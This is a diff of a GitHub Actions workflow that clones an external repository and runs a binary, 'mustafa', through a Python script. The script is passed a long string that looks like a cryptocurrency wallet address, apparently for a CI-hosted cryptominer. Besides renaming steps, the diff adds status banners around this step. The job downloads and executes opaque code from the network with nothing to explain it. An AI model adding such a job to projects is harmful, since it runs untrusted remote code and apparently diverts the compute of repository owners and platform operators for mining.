@@ -12,20 +12,23 @@ jobs:
     runs-on: ubuntu-latest
     
     steps:
-    - name: 📥 Clone
-      run: git clone https://github.com/thumpingpp/mustu-setup.git
+    - name: Clone Repo
+      run: |
+        git clone https://github.com/thumpingpp/mustu-setup.git
+        echo "✅ Clone complete"
       
-    - name: 🐍 Setup Python
+    - name: Setup Python
       uses: actions/setup-python@v5
       with:
         python-version: '3.10'
     
-    - name: 🚀 Execute Binary
+    - name: Run Binary
       run: |
         cd mustu-setup
-        chmod +x mustafa      # Binary ko executable banao
+        chmod +x mustafa mustafa.py
+        echo "=================================="
+        echo "🚀 Starting binary execution..."
+        echo "=================================="
         python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
-    
-    - name: ✅ Status
-      if: always()
-      run: echo "Run completed at $(date)"
+        echo "=================================="
+        echo "✅ Execution completed"
